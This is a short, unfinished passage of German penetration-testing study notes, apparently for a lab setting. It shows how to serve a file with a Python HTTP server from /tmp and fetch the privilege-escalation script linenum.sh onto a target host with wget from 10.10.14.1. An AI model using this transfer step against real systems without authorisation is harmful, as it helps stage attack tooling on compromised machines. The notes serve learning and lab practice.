Um Daten übertragen zu können von einer Maschine zu einer anderen können wir folgendes machen:
# Using wget
Dafür müssen wir im Verzeichnis wo unsere Datei sich befindet einen `python HTTP Server` laufen lassen, dieser ist zu gleich unser listining server
```shell-session
cd /tmp   #Hier befindet sich die Datei
python3 -m http.server 8000
```

Nun können wir com Zielhost die Datei runterladen
```shell-session
wget http://10.10.14.1:8000/linenum.sh
```
wenn du kein 